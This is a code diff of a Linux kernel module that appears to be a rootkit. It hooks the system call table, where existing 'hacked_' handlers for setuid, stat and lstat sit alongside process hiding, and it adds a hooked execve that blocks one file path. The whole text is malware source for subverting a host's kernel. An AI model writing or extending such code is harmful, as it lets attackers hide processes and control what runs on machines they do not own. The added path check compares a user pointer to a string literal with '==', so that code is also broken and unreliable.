@@ -2,6 +2,20 @@
 
 unsigned long** sys_call_table;
 
+asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]){
+
+long ret = 0;
+
+if(filename == "/home/vagrant/hullo"){
+ret = -ENOENT;
+}
+else {
+ret = (*orig_execve)(filename, argv, envp);
+}
+
+return ret;
+}
+
 asmlinkage long hacked_setuid(uid_t uid)
 {
     long ret = 0;
@@ -601,6 +615,8 @@ static int __init initModule(void)
     HOOK_SYSCALL(sys_call_table, orig_lstat, hacked_lstat, __NR_lstat);
 
     HOOK_SYSCALL(sys_call_table, orig_stat, hacked_stat, __NR_stat);
+
+    HOOK_SYSCALL(sys_call_table, orig_execve, hacked_execve, __NR_execve);
 
     init_hide_processes();
 
